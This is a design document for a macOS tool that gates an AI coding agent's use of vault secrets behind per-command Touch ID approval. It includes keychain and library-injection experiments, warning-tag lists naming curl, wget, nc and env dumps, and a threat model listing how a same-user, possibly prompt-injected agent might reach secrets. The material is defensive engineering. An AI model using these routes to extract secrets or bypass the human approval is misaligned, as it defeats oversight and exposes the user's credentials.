# wardenrun: design

Status: **approved by the maintainer on 2026-10-18**, with the README requirements of section 12.
No product code exists yet.
Inputs: the original requirements and the research below (every claim is marked *verified*
with its source, or *inferred*).

## 1. What this is

`wardenrun` lets an AI coding agent use a secret from a Vaultwarden vault **without ever
seeing it**. Every use needs the human's Touch ID, in a dialog that shows the exact command.
The secret goes straight into the child process; the child's output is masked on the way back.

```
wardenrun run example-api -- python3 script.py    # Touch ID, secret injected, output masked
wardenrun new staging-db-admin                     # Touch ID, generate + store, never printed
```

One-shot process, no daemon, wraps the official `bw` CLI, macOS first.

## 2. Goals, non-goals, anti-goals

**Goals**
- An agent running as the same macOS user cannot obtain a secret it was not approved for.
- Secrets never reach transcripts, logs, shell history, `.env` files or an unlocked vault.
- Installable like any outside project: `brew install mateuszgachowski/tap/wardenrun`.
- Honest security claims. README and `THREAT_MODEL.md` say what is and is not protected.

**Non-goals (v1)**
- Reimplementing Bitwarden crypto (we drive `bw`).
- Linux/Windows (designed for, not built, see section 10).
- Defending against root or malware, or against an *approved* malicious command.
- A secrets *manager* UI. Items are created in the Vaultwarden clients; `new` only generates.

**Anti-goals** (would make it a failure even if it "works")
- Any code path where a secret value reaches the agent's stdout/stderr, a log, or argv.
- A background process holding an unlocked vault or an IPC socket the agent can talk to.
- Marketing "Touch ID protected" where the OS is not actually enforcing it (see section 3).

## 3. The hard part: can the agent get the master password without Touch ID?

### 3.1 What was verified

Environment: macOS 15.8, an Intel Mac with a T2 chip and Touch ID enrolled, SIP on, binaries
signed ad-hoc with no entitlements (what a Homebrew-distributed binary looks like) unless a
row says otherwise. Probe sources are throwaway and are not in the repo. Everything was run
against temporary keychains; the login keychain and the trust settings were not modified.

| # | Experiment | Result |
|---|-----------|--------|
| 1 | `SecItemAdd` to the **data protection keychain** (`kSecUseDataProtectionKeychain`), plain item | `-34018` *A required entitlement isn't present* |
| 2 | Same, with `.biometryCurrentSet` / `.userPresence` access control | `-34018` |
| 3 | **File-based keychain**, plain item | OK |
| 4 | File-based keychain, item with `.biometryCurrentSet` / `.userPresence` | `-34018`. The OS refuses biometric ACLs without the entitlement, even in the legacy keychain. |
| 5 | Secure Enclave key with any access control (`.privateKeyUsage`, +biometry) | `-25308`, `AKSError -536870174` (not permitted). Only an ACL-less, non-persistent SE key is creatable, which is useless for storage. |
| 6 | `LAContext.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: <152 chars>)` from a bare, hardened-runtime ad-hoc CLI started from an agent's shell, with the password fallback hidden | `canEvaluate = true`, `biometryType = touchID`; the system sheet appeared and a fingerprint was **accepted** (exit 0), twice. By screenshot: the 152-character reason is shown **in full**, wrapped over three lines, inside the system's own sentence `<binary name> <wants to> <reason>. <Use Touch ID to allow.>` (localized by the system). The only button is Cancel (no password fallback). The sheet shows the binary's file name and a generic "exec" icon. The truncation limit for longer reasons is measured in test 13. |
| 7 | File-based keychain item with ACL = "this binary only" (`SecAccessCreate` + `SecTrustedApplication`), read by (a) same binary, (b) byte-identical copy at another path, (c) a different ad-hoc binary, interaction disabled | (a) read, no prompt. (b) read, no prompt: the ACL binds to **code identity (cdhash), not path**. (c) **denied** (`-25293`; with interaction enabled this is the keychain-password dialog) |
| 8 | `DYLD_INSERT_LIBRARIES=evil.dylib` against ad-hoc binaries | Loaded into the **non-hardened** binary. **Ignored** by an ad-hoc binary signed with `-o runtime` (hardened runtime). |
| 9 | Can a sibling process of the same user read a child's environment via `ps eww`? | **Yes** for ordinary binaries, even hardened-runtime ones. No for Apple platform binaries (`/usr/bin/sleep`). |
| 10 | Developer Tools / debugger attach | `DevToolsSecurity`: developer mode disabled on this machine; attach needs admin auth. Not a guarantee on other machines (Xcode enables it). |
| 11 | Same ACL as test 7, but the binaries are signed with a **free, self-generated code-signing certificate** (hardened runtime, one fixed identifier). Read by: the creating build `v1`; a **new build `v2`** (different cdhash, same certificate); a build with the same identifier but a **different certificate**; an ad-hoc re-signed copy with the same identifier; an unsigned copy. | `v1` read; **`v2` read, no prompt**; the other certificate, the ad-hoc copy and the unsigned copy **all denied** (`-25293`). The ACL stores the designated requirement `identifier "..." and certificate leaf = H"<cert hash>"`, so it survives upgrades and cannot be matched without the private key. |
| 12 | `DYLD_INSERT_LIBRARIES` against the self-signed binaries | Loaded without hardened runtime; **ignored with `-o runtime`**, same as ad-hoc (test 8). |
| 13 | Touch ID sheet with a **700-character** reason carrying markers `[#100]`...`[#700]` | Sheet shown, fingerprint accepted. By screenshot, the text is complete up to `[#500]` and then **cut silently after about 510 characters** (`...[#500]filler text f.`): no ellipsis, no marker, nothing tells the reader that anything is missing. About 11 lines of text. A command line whose tail is cut off would hide exactly the part an attacker wants hidden, so this sets a hard cap and a deny-instead-of-truncate rule (5.3). |

### 3.2 What the sources say (verified)

- Apple TN3137: biometric protection of items and Secure Enclave keys **require the data
  protection keychain**. Its access groups come from code-signing entitlements that
  "must be authorized by a provisioning profile". "Your program needs an app-like bundle
  structure in which to embed that profile. This is standard for app and app extensions but
  not for command-line tools."
- Apple TN3125: "A standalone executable can't claim a restricted entitlement because
  there's no place to embed the provisioning profile". `keychain-access-groups` is a
  restricted entitlement. The workaround is an app-like wrapper
  (`X.app/Contents/MacOS/x` + `Contents/embedded.provisionprofile`).
- Apple DTS (forum thread 125510): "To interact with keys protected by the SE you must use
  the iOS-style keychain, and that requires an entitlement that's authorised by a
  provisioning profile. A tool has nowhere to store a provisioning profile."
- Existence proof that the wrapper approach works for open source: **Secretive**
  (Secure Enclave SSH agent) ships `keychain-access-groups` in its entitlements, is
  distributed via GitHub releases and `brew install secretive`. *Inferred:* it uses a
  Developer ID profile (App Store builds are not on GitHub).
- Bitwarden Desktop on macOS (`bitwarden/clients`,
  `os-biometrics-mac.service.ts`, `desktop_native/core/src/password/macos.rs`): calls
  `systemPreferences.promptTouchID` (a UI gate) and then reads a plain generic password from
  the file-based keychain. **No biometric ACL.** It also calls `PT_DENY_ATTACH`
  (`process_isolation/macos.rs`). So the strength of our Tier B (below) equals what the
  official desktop client does.
- Homebrew 5.0.0 notes: "We will disable all Homebrew/homebrew-cask casks that fail
  Gatekeeper checks in September 2026" and `--no-quarantine` is deprecated. The note names
  `homebrew/homebrew-cask` only; whether third-party tap casks are affected is *unknown*.
  Formula downloads fetched by `curl` carry no quarantine attribute (verified:
  `xattr` shows none), so an ad-hoc binary in a formula is not blocked by Gatekeeper.

### 3.3 Options and what each one actually protects against

| Option | Needs | OS-enforced Touch ID on every read? | Stops a same-user agent from... | Does **not** stop |
|---|---|---|---|---|
| **A. Data protection keychain item with `.biometryCurrentSet`** (**not planned**, see 3.4) | Apple Developer Program (paid), Developer ID cert, provisioning profile with `keychain-access-groups`, `.app` wrapper, notarization. Ships as a **cask**. | **Yes.** Even a fully compromised wardenrun process cannot read it without a touch. | reading the item from any process; replaying a stolen session; patching our binary | root/malware; a touch the user gives for a malicious command |
| **B. File-based login keychain, ACL = this binary, plus `LAContext` biometric gate in wardenrun** (**the product**) | Nothing paid. Hardened-runtime signature with a **stable, maintainer-generated self-signed certificate** (tests 11 and 12). Works in a plain Homebrew **formula**. | **No.** The gate is in our code. The OS only enforces "only this binary may read". | reading the item from another process (denied, tested); running wardenrun without a touch; `DYLD_` injection (blocked by hardened runtime, tested) | an attacker who can run code *inside* a wardenrun process (needs debugger rights or a non-hardened build); user clicking "Always Allow" in a keychain dialog for a trojan |
| **C. Secure Enclave key wrapping the master password** | Same entitlements as A. | Yes | Same as A | Same as A. Adds only hardware binding, which A's biometric ACL already gives. Not worth the extra moving parts. |
| **D. No storage: type the master password each time** | Nothing | n/a | everything stored | usability. Offered as `--no-store` fallback, not the default. |
| **E. Root-owned secret + `sudo` with `pam_tid`** | admin rights, PAM config | Yes (via PAM) | reading the file without a touch | Setup friction, and the touch prompt does not show our command line. Rejected for v1. |
| **F. Store `BW_SESSION` / leave vault unlocked** (what 1Password-less setups do today) | Nothing | No | nothing | everything. This is the problem we are solving. |

### 3.4 Decision

1. **Ship Tier B only, with no paid Apple account** (maintainer decision, 2026-10-18: US$99/yr
   is not acceptable for a free open-source tool). Tier B works today and matches the
   official Bitwarden Desktop's guarantee. The `SecretStore` protocol stays, so a Tier A
   backend can be added by anyone who holds a Developer account, but **Tier A is not on the
   roadmap**. The honest consequence: the original ideal ("every read triggers Touch ID at the
   OS level, not just in our UI") is **not met**; the gate is wardenrun's own code, hardened
   against injection and bound to its signature (threat model, section 6).
   *Unverified lead, not relied on:* a free Apple ID "Personal Team" may be able to sign a
   locally built `.app` with keychain sharing for personal use (one source says macOS free
   accounts include it; free profiles are short-lived and need Xcode). Worth a spike only if
   OS-enforced Touch ID turns out to matter to users.
2. **The README says plainly which tier is active.** `wardenrun doctor` prints it.
   Tier B is described as "approval enforced by wardenrun, storage restricted by the OS to
   the wardenrun binary", never as "Touch ID protected keychain".
   *Known behavior, to be stated in the README and the threat model (row 2):* when another
   program asks to read the item and a screen session exists, macOS may show a **keychain
   password dialog** for that program ("<program> wants to use the keychain, enter the keychain
   password"). Nobody answering means refused; typing the login-keychain password into such a
   dialog grants that program the item. wardenrun's own reads never show it: it asks the
   keychain not to prompt, and a read that would need a prompt fails.
3. **Blast radius is limited at the vault, not only on the Mac.** wardenrun is designed to
   be used with a **dedicated low-privilege Vaultwarden account** that is a member of one
   organization and sees one collection. Even a total compromise of the stored master
   password exposes that collection only. README tells users never to store their personal
   vault's master password. This is the strongest control and does not depend on macOS.
4. **What is stored:** the master password of that dedicated account (the CLI has no PIN or
   user-key unlock mode; see 5.2). It should be a long random value (24+ characters from a
   password manager, pasted once at `setup`), because the `bw` profile on disk lets a
   same-user process attempt offline guessing. Security-relevant settings (server URL,
   account, allowed collection, pinned `bw` identity) live **inside the protected keychain
   item**, not in a user-writable config file the agent could edit.
5. **Tier B hardening is mandatory, not optional:** hardened-runtime signature (without
   `allow-dyld-environment-variables`, `get-task-allow`, or `disable-library-validation`),
   `PT_DENY_ATTACH`, `RLIMIT_CORE=0`, secrets in `mlock`ed buffers zeroed after use,
   refuse to run if `DYLD_*` is set or the binary is not hardened (`wardenrun doctor`).
6. **A stable signing identity instead of paying.** An ad-hoc signature is bound to the
   cdhash, so every `brew upgrade` would make the stored item unreadable (test 7c). Instead,
   the maintainer generates **one self-signed code-signing certificate** (free, `openssl`),
   keeps its private key as a CI secret, and signs every release with it, with a fixed
   identifier and hardened runtime. The keychain ACL then holds `identifier "..." and
   certificate leaf = H"<hash>"`: upgrades keep working (test 11, `v2`), and a different
   certificate cannot match without the key. The cost is key custody: if the key leaks, an
   attacker can sign a binary that passes the ACL (threat 18); rotating the certificate makes
   everyone re-run `wardenrun setup`. The certificate hash is published in the README and
   printed by `wardenrun doctor`. A build from source is signed ad-hoc (or with the builder's
   own certificate) and needs `setup` after each rebuild. `doctor` detects an unreadable
   item and says so.

## 4. Language: Swift

Needs native Touch ID (`LocalAuthentication`), Keychain (`Security`), `proc_pidpath`, and
one self-contained binary. (No UI toolkit: the system Touch ID sheet is the whole UI, 5.3.)

| | Swift | Rust | Go |
|---|---|---|---|
| LocalAuthentication / Security | first-party, no FFI | `objc2-*` + `security-framework` crates; the biometric gate code is FFI-heavy | cgo; painful |
| Universal macOS binary | `swift build --arch arm64 --arch x86_64` | `lipo` two builds | `lipo` two builds + cgo cross toolchain |
| Runtime to ship | Swift runtime is in macOS 12.3+ | static | static |
| Linux later | works (Foundation on Linux), no LocalAuthentication/Security | best | good |

Swift wins on the part that is hard on macOS (Keychain, LA, UI). Rust would win the Linux
port. The cost is contained by splitting the code into a platform-neutral `WardenrunCore`
(masking, policy, audit log, `bw` driver, env sanitising, CLI parsing) that builds on
Linux, and `WardenrunMac` (store, approver, process inspection) behind protocols. This is
a design call; changing it later only touches the platform layer.

SwiftPM only. No external dependencies in v1 (a TOML/arg parser can be 200 lines;
`swift-argument-parser` is acceptable if the builder prefers, as it is Apple-maintained).

## 5. Architecture

One short-lived process per invocation. No daemon, no socket, no cache. Everything that
touches a secret happens between approval and `exec`, inside one process.

### 5.1 `wardenrun run` flow

```
wardenrun run <item> [--env VAR=field]... [--file VAR=field]... [--stdin field] -- cmd args...
```

1. **Self-check** (no secrets involved): hardened-runtime flag present, no `DYLD_*`, a window
   server session exists (otherwise refuse to start, exit 78: no remote approval), `PT_DENY_ATTACH`, core dumps off.
2. **Resolve the request**: look `cmd` up on the caller's `PATH` to an absolute path, hash
   that executable, record cwd and the parent chain (`proc_pidpath` up to the terminal).
   Reject argv containing NUL.
3. **Read the protected item** from the `SecretStore` (master password + pinned settings).
   This comes *before* the question, so that a Mac that is not set up fails (exit 1) without
   asking anyone anything. Nothing is fetched from the vault yet. Only then is the approval
   text (5.3) built: a command that does not fit the 400-character budget is not approved
   (audit `denied`, exit 77), and the sheet lists where the flags send the secret. (Call made during the
   implementation of `run`; the first draft read the item after the approval. The sheet text
   does not depend on it.)
4. **Rate limit**: one pending prompt, cool-down after repeated denials.
5. **Approval** (5.3). Deny, timeout, no sensor, lock-out, or a text over the budget: audit
   (`denied`, `timeout` or `error`), exit 77, nothing fetched. (No screen session never gets
   here: the start-up check refuses it with exit 78 before step 1, nothing audited.) Approved:
   audit line `approved` is written now, before anything is fetched.
6. **Fetch the one item** through `bw` (5.2): unlock, sync, list the allowed collection only,
   pick the exact-name match (exactly one, or fail), lock. The session is discarded
   immediately and the master password zeroed. The injection plan (5.4) is built from the
   item and the item's buffers are wiped before the child exists.
7. **Last look, then spawn the child** with `posix_spawn` using the *same* resolved path and
   argv that were shown, after the program file was hashed once more (a changed hash starts
   nothing, exit 1). The environment is the caller's own plus the requested variables; the
   child inherits only descriptors 0, 1 and 2. stdout and stderr are pipes through the masker
   (5.5). `HUP`, `INT`, `QUIT`, `TERM`, `USR1` and `USR2` sent to wardenrun are forwarded to
   the child, which stays in wardenrun's process group; the exit status is propagated (128+n
   for a signal; 126 and 127 when the command cannot be run or found, as a shell would). A
   signal that arrives before the command starts ends the run instead: nothing starts, the vault
   is locked, exit 1.
8. **Clean up** temp files, zero buffers, write the audit line `finished` with the exit
   status and the duration (5.7).

There is no window between "approved" and "used" in which another process can substitute
the command line or the request: approval, fetch and exec are the same process and the same
request object. The program *file* is different. It is hashed when the request is resolved and
checked again just before it is spawned, but a process of the same user that can write that file
can still swap it in the instant between that check and the exec. The sheet therefore tags such
files (`[writable exe]`, 5.3) so the human knows the hash does not pin the content.

### 5.2 `bw` driver

Facts that shape the driver (verified in `bitwarden/clients` tag `cli-v2026.10.0` unless
marked *tested* or *inferred*):

- **Unlock needs the master password.** `--passwordenv`, `--passwordfile` or a prompt; no
  stdin option, no PIN in the CLI, and API-key login does not replace the password.
  Biometric unlock exists only through Bitwarden Desktop and behind a server feature flag.
- **`BW_SESSION` + `data.json` decrypt the cached vault offline**, without the master
  password. `bw lock` removes the protected user key, but the access and refresh tokens (and
  the API-key secret, if used) **stay in `data.json` in plaintext**, mode `0600`
  (the CLI has no secure storage). *Inferred:* the file also holds the encrypted
  vault and the wrapped user key, a target for offline guessing of the master password.
- `bw get` has **no collection filter** (`--collectionid` exists only on `list items`; several
  filters are OR). `get <phrase>` decrypts the whole vault and does a fuzzy substring match.
- **Sync is never automatic**; `get`/`list` read the local cache.
- Concurrent `bw` processes race on the single-use refresh token and can wipe the profile
  (`bitwarden/clients#23828`, fix unconfirmed).
- HTTPS is mandatory (*tested*: `http://127.0.0.1` is refused). `bw` >= 2026.9.0 needs
  Vaultwarden >= 1.37.4; older `bw` breaks on 1.37.4 (removed `prelogin`). Bitwarden treats
  Vaultwarden issues as unsupported.
- `login` and `unlock` may migrate the account (user-key id backfill, KDF minimum).
- *Tested* on an Intel i7: about 1 s startup and about 3 s wall time per command.
- The official macOS `bw` from GitHub releases is signed `Developer ID Application:
  Bitwarden Inc (LTZ2PFU5D6)` with hardened runtime (*verified locally* with `codesign`).
  Homebrew's `bitwarden-cli` is instead a Node script (`depends_on "node"`).

Driver rules:

1. **Pinned binary.** Preferred: the signed GitHub-release `bw`, pinned by its absolute path
   (a regular file, not a symlink) and checked on every run against a code requirement on team
   `LTZ2PFU5D6`. Anything else is refused, **including Homebrew's Node build**: `bw.js` loads
   about thirty packages from `node_modules`, webpack chunks and wasm from beside it at run
   time (the code that receives the master password), and Homebrew's prefix is writable by the
   user, so a hash of `node` plus `bw.js` would call code "pinned" that nobody checked
   (review finding, verified against `@bitwarden/cli` 2026.10.0). Hashing the whole package
   tree would still leave Homebrew's dylibs. `setup` therefore asks for the signed release.
   The pin lives in the protected item (5.8). The check is made once, just before the spawn; it narrows
   the swap window for a file the user can write, it does not close it (see 5.1).
2. **Allowlisted environment, nothing inherited:** `HOME`, `LANG`,
   `BITWARDENCLI_APPDATA_DIR` (wardenrun's own dir), `BW_NOINTERACTION=true`, a `PATH`
   containing only the pinned directories, and `NODE_EXTRA_CA_CERTS`/`https_proxy` only
   if set in the protected item. No `NODE_OPTIONS`, no `BW_*` from the caller. Refuse if a
   `bw-data` directory sits next to the binary (it silently overrides the app-data dir).
3. Always `--nointeraction --response`, stdout/stderr as pipes, tolerant JSON parsing. stderr
   is treated as noise: never shown raw, masked before it is ever logged.
4. **One `flock` around the whole `bw` phase** of a run (`~/.config/wardenrun/bw.lock`).
5. **Sequence for `run`:** `unlock` → `sync` → `list items --collectionid C
   --organizationid O` → pick the item **in wardenrun** by exact, case-sensitive name
   (`deletedDate` null, member of C, exactly one) → `lock`. Never `get <name>`, never
   `--search`, never `--session`. `sync` runs every time by default (`--offline` skips it)
   because a stale secret fails confusingly; this is a design call.
   `bw` ORs its `--collectionid` and `--organizationid` filters (read in `list.command.ts`,
   2026.10.0): the reply is every item of the organization, plus any in the collection. That
   is why the item check ("member of C") is wardenrun's own, and why the dedicated account
   should see only the allowed collection. wardenrun asks once per allowed collection; one
   request for the organization would return the same items (deferred, ledger).
6. **How the master password and session reach `bw`: a decision ladder, settled by a spike
   that opens PR3** (it needs a real Vaultwarden test server; `bw serve` without a logged-in
   profile exits immediately with "You are not logged in", so it could not be probed in
   research):
   - **a. Preferred:** one `bw serve --hostname fd+connected://N --nointeraction` per run on
     an inherited socketpair (present in `serve.command.ts`, undocumented). The password goes
     in the `POST /unlock` body and items come back over the same socket. No password and
     no `BW_SESSION` in any argv or environment, and no TCP port. Needs the profile logged
     in by `setup` first. Its Host/Origin guards (`bw` 2026.10.0, read in the source) accept only
     `localhost:<port>`, `127.0.0.1:<port>` and `[::1]:<port>` plus the machine's own name with
     the port, and the port is added to the name even for the socket mode: wardenrun starts
     `serve --port 8087` and sends `Host: localhost:8087`; a bare `Host: localhost` gets 403.
   - **b.** `unlock --passwordfile /dev/fd/N` fed by a pipe, then `BW_SESSION` in the
     environment of each short-lived `bw` child. Leaves `BW_SESSION` visible to `ps eww`
     for seconds (threat 16).
   - **c.** `--passwordenv`: last resort; the master password itself is visible for the
     unlock (threat 16).

   Whichever rung ships, the README states it and `doctor` reports it.
7. **Always `lock`**, also on error and on signals. The session key lives only in
   wardenrun's memory; if wardenrun is killed, the protected key blob left in `data.json`
   cannot be opened without it. Optional `logout_after_run = true` also removes the tokens
   from disk (slower: a full login per run).
8. **Login at `setup`:** `bw config server <https url>`, then `bw login` with the master
   password (leaves only tokens on disk) or, for a 2FA account, `--apikey` (bypasses 2FA but
   leaves the client secret on disk). Password login on a dedicated
   account is recommended.
9. **Compatibility table** (tested `bw` ↔ Vaultwarden) is checked by `doctor`; the formula
   declares the supported range.
10. **Latency, stated honestly:** expect roughly 5–12 s of `bw` overhead per approved run
    (rung a is about one startup plus one KDF; rungs b and c are several `bw` processes).

### 5.3 Approval

- **v1 uses only the system Touch ID sheet** (`LAContext.evaluatePolicy(
  .deviceOwnerAuthenticationWithBiometrics)`, password fallback hidden). No custom window,
  no AppKit. The `localizedReason` string *is* the whole approval UI. The system renders it
  as `<binary file name> <wants to> <reason>. <Use Touch ID to allow.>` with only a Cancel
  button (test 6), so there is no Approve button to synthesise a click on.
- **Reason format**, written so it reads after the system's "wants to":
  `[warning tags] use secret "<item>" to run: <resolved exe> <args> (from <parent>) [end]`.
  Tags come first because the tail is where space runs out.
- **Hard cap, deny instead of truncate.** The system cuts long text *silently* at about
  510 characters (test 13). wardenrun budgets **400 characters** for the whole reason
  (counted after escaping; margin for other locales and OS versions). If the command does
  not fit, the request is **denied** and the caller gets on stderr: `command too long to
  review (N > 400); put it in a script file`. The text is never shortened or elided. The
  closing `[end]` makes any truncation by a future OS version visible.
- **Escaping:** control characters, newlines and bidirectional overrides are shown as
  visible escapes (`\n`, `\u{202E}`); arguments with spaces or quotes are shown shell-quoted;
  a non-ASCII character in the executable path, the item name or any argument adds a
  `[non-ASCII]` tag, and spaces other than the ASCII space and blank-looking characters are
  escaped as well. This
  stops a command from forging the system's own surrounding sentence or reordering itself.
- **Soft warning tags** (never auto-deny): `[shell -c]` for `sh/bash/zsh -c` and
  `python -c`, `[network]` for `curl`, `wget`, `nc`, `ssh`, `scp`, `[env dump]` for
  `env`/`printenv`, `[exe changed]` when the executable hash differs from the last
  approval for this item and path (advice only: the log it is read from is not a trust
  anchor, and a program at a new path has nothing to compare with), `[writable exe]` when the executable or its directory is writable by
  the current user (typical for scripts and tools in a project, absent for system binaries),
  `[env: NAME]` for each variable in the child's environment that makes ordinary programs run
  somebody's code at startup (`NODE_OPTIONS`, `BASH_ENV`, `LD_PRELOAD`, `DEVELOPER_DIR`, `GIT_SSH`, proxy and CA-bundle
  variables, ...; the list is not complete and the sheet shows the command but not the
  environment), `[non-ASCII]`. With flags the sheet says where the secret goes (`as $VAR,
  file $VAR, stdin`); without flags the item's `env:` fields are injected and cannot be named
  before the item is read. The parent's name is the process's own and only a hint.
- Details that do not fit (executable SHA-256, cwd, full parent chain) go to the audit log
  (5.7), not the sheet; the injection targets are on both (`injected`).
- Timeout 60 s (the sheet is invalidated by wardenrun). After 3 denials or timeouts in
  5 minutes: 60 s lock-out.
- The limit's state lives in `~/.config/wardenrun/state/`: a `flock`ed file for "one sheet at
  a time" and `approval-state.json` with the times of recent refusals (no names, no commands).
  wardenrun is a one-shot process, so the files are the only memory it has. A process of the
  same user can delete them and so lift the lock-out: the limit slows a pestering agent, it is
  not a barrier against one that can delete files (threat 10). A state folder that cannot be
  used makes the gate **refuse**, never approve.
- Accepted limits of the system sheet: it shows the binary's file name and a generic "exec"
  icon, and it is localized by the system while our reason text is English. A richer UI can
  be added later as another `Approver` behind the protocol, but it is **not** part of v1.

### 5.4 Injecting the secret

| Mode | How | Exposure |
|---|---|---|
| `--env VAR=field` | environment of the child | readable by same-user `ps eww` for the child's lifetime (threat 9) |
| `--file VAR=field` | file `0600`, named after the (validated) variable, in a fresh `0700` directory `wardenrun-XXXXXX` under the per-user temporary directory (`confstr(_CS_DARWIN_USER_TEMP_DIR)`, not `$TMPDIR`, which the caller controls), path in `VAR`, removed when the child ends (also after a forwarded signal) | readable by the same user while it exists; **left behind** if wardenrun gets `SIGKILL` (or `TERM` in the instants before the child starts) |
| `--stdin field` | written to the child's stdin pipe, then closed | not visible to `ps`; only works for tools that read secrets from stdin |

The target `VAR` of `--env` and `--file` may not be a name that chooses a program or a directory:
`HOME`, `PATH`, `TMPDIR`, `SHELL`, `USER`, `LOGNAME`, `PWD`, `OLDPWD`, `CDPATH`, `MANPATH`, any
`XDG_*`, `GIT_*` or `NPM_CONFIG_*`, and the risky names of 5.3 (the agent picks the name).
`field` is `password`, `username`, `notes`, `uri`, or the name of a custom field. `totp` parses
but is refused: the vault holds the seed, not a code, and handing out the seed would be a
different feature. A field that is missing or empty is an error (never an empty variable); a
value containing a NUL byte cannot be an environment variable and is accepted only by `--stdin`
and `--file`. With no flags, custom fields named `env:VAR` on the item are injected as `VAR`
(so the item itself says which variables it provides); with any flag, only what the flags ask
for is injected. These conventions are design calls.

### 5.5 Masking

Streaming replacement on stdout and stderr, independently, with a hold-back of
`longest needle - 1` bytes so values split across chunks are still caught. Needles per
value: raw, base64 (standard and URL-safe, padded and unpadded, all three alignments),
percent-encoded, hex (both cases), JSON-escaped, single-quote shell-escaped; multi-line values
are also matched per line. Replacement text: `[REDACTED:<item>]`. A minimum needle length
(suggested 6 bytes) avoids garbling output; shorter secrets trigger a warning that masking is
unreliable. Children see pipes, not a TTY (colour and interactive tools degrade); a PTY mode
is a later feature. Masking is an **accident guard**, not an exfiltration barrier (threat 8).

### 5.6 `wardenrun new <name>`

```
wardenrun new <name> [--username U] [--uri URL] [--env VAR] [--length 32] [--charset alnum|full]
```

1. Validate the name (no control characters, at most 100 chars). Read the protected item
   (as in 5.1 step 3). The password is generated **after** the approval (step 2), **inside
   wardenrun** with `SecRandomCopyBytes` and rejection sampling (not `bw generate`: no extra
   process, no extra 3 s). Length 16–128, default 32. `alnum` (default) works everywhere;
   `full` adds symbols except quotes, backslash, backtick, `$` and whitespace
   (`!#%&()*+,-./:;<=>?@[]^_{|}~`).
2. **Approval** dialog: `create item "<name>" in collection <C>; [username "…"; uri "…";
   stored as env:VAR;] password of N characters (letters and digits), never shown (from
   <parent>) [end]`, escaped and within the same 400-character budget as `run`.
3. Same `bw` session as `run` (5.2): `unlock` → `sync` → `list` (refuse if the name already
   exists) → create → `lock`. The item JSON is built in memory in a locked buffer and sent as
   the body of `POST /object/item` to `bw serve`, so nothing secret is in an argv. The response
   contains the full item including the password: it is read from the channel, only `id` is
   kept, the rest is zeroed.
4. Item shape: type 1, `organizationId` and `collectionIds: [C]`, `folderId: null`,
   `login.username`/`uris`, and the password in `login.password`; with `--env VAR` it is
   stored instead as a hidden custom field (`type: 1`) named `env:VAR` (5.4).
   The organization-collection create path in the SDK was not verified in research: the
   Vaultwarden integration test must cover it.
5. Output is one line: `created "<name>" (id ...) in <collection id>`. Never the value.
6. Audit event `new` (there is no separate `approved` line for `new`; a refusal or a failure
   is `denied`, `timeout` or `error`). *Later idea, not v1:* `new --then -- cmd` generates, injects into `cmd`
   and stores only if `cmd` succeeds, so the target service and the vault cannot drift apart.

### 5.7 Audit log

`~/Library/Logs/wardenrun/audit.jsonl`, mode `0600`, append-only (`O_APPEND`), one JSON
object per line: time, event (`approved`, `denied`, `timeout`, `error`, `new`, `setup`,
`finished`), item name, command line, resolved executable + hash, cwd, parent chain, tier,
exit status, duration. **Never values from the vault.** `approved` is written after the touch
and before the vault is contacted, so it holds the command line as the agent typed it: no
secret exists yet to mask, and a secret the agent typed into the command line itself is
therefore in the log. Lines written after the command starts have the injected values
masked. `finished` (exit status and duration, no command line) is written only when the
command really ran, which tells a command's own exit 77 from a refusal. If the log cannot be
written wardenrun warns on stderr and carries on (a full disk must not stop work: the
approval has already happened). Each line carries the SHA-256
of the previous line, so accidental damage and clumsy edits or deletions in the middle are
detectable. It is not tamper-proof: the hash has no key, so a process of the same user that
knows the format can rewrite lines and recompute the chain, drop the last lines, or delete
the file. Keying the chain with a secret and a counter kept in the protected item is a possible
later hardening.

### 5.8 State and configuration

- `~/.config/wardenrun/config.toml`: preferences only (approval timeout, redaction text,
  log path). Nothing in it can widen access. **Deferred, not built in v1:** nothing reads this
  file yet and the defaults are compiled in (timeout 60 s, redaction `[REDACTED:<item>]`, log
  `~/Library/Logs/wardenrun/audit.jsonl`). It is listed so that no setting is ever added that
  could widen access.
- `~/.config/wardenrun/bin/bw`: the copy of the signed release `bw` that `setup` makes (folder
  `0700`) and pins; `~/.config/wardenrun/bw.lock` keeps two wardenruns from using `bw` at once;
  `~/.config/wardenrun/state/` holds the approval limit (5.3).
- `~/.config/wardenrun/bw/`: wardenrun's **own** `BITWARDENCLI_APPDATA_DIR`, so it never
  touches or depends on the user's personal `bw` session.
- **In the protected keychain item** (JSON blob): server URL, account e-mail, organization
  and allowed collection IDs, the master password, and the pinned `bw` identity (team
  ID and absolute path of the signed release).
  Changing any of it goes through `wardenrun setup`, which needs the master password typed at
  a terminal plus an approval dialog that shows old and new values (threat 15). A terminal is
  not proof of a human (a script can open a pseudo-terminal): the Touch ID approval is the gate.
  The order inside `setup` is fixed and tested: validate the answers, approval (nothing has
  changed yet), copy `bw` and check the copy's signature, `bw logout` (a failure is ignored),
  `bw config server`, `bw login` with the password on an inherited pipe, unlock and lock as
  proof, and **only then** save the item and write the audit event. All of that happens in a
  **staged** profile folder (`bw.staged-<uuid>` next to the live one) under `bw.lock`; only after
  the proof is the staged folder renamed over the live one, so a failure at any step leaves the
  item and the working profile as they were and the staged folder is deleted. The account must
  log in with the password alone (two-step login is not supported yet), and the signing
  certificate's revocation is not checked (no network call).
- `wardenrun doctor`: prints tier, signature flags, hardening status, `bw` pin status,
  keychain item readability, Touch ID availability. No secrets. Server reachability is
  **deferred**: `doctor` makes no network call.

## 6. Threat model

(Restated in plain language in `docs/THREAT_MODEL.md`, which the README links.)

**Attacker:** an AI agent (or a prompt-injected one) running shell commands as the **same
macOS user** as the human, with no root. It can read any file that user can read, list
processes, run any binary, set any environment variable, edit dotfiles, and call
`security`/`bw`. It cannot produce a fingerprint.

**Assets:** (1) the master password of the dedicated vault account, at rest and in memory
for the few seconds of a run; (2) item values; (3) the vault session key and the `bw`
profile on disk.

| # | Attack | Outcome | Control |
|---|---|---|---|
| 1 | Read `.env`, shell history, transcripts | Nothing to find | Secrets never written; output masked; audit log holds names only |
| 2 | Run `bw` or `security find-generic-password` | Denied | Keychain ACL bound to wardenrun's signing requirement: foreign certificate, ad-hoc and unsigned callers are refused (tests 7, 11). Session key never persisted. |
| 3 | Run `wardenrun run X -- cmd` | Human decides | Full resolved command line (400-character cap, over-long commands are denied, never truncated), parent; executable hash and cwd in the audit log; one pending prompt at a time; 60 s timeout; lockout after repeated denials |
| 4 | Fake the approval | Not possible | No clickable "Approve" exists. The only gesture is the system biometric sheet. Password fallback is off by default. No window server session (ssh, cron) means deny. |
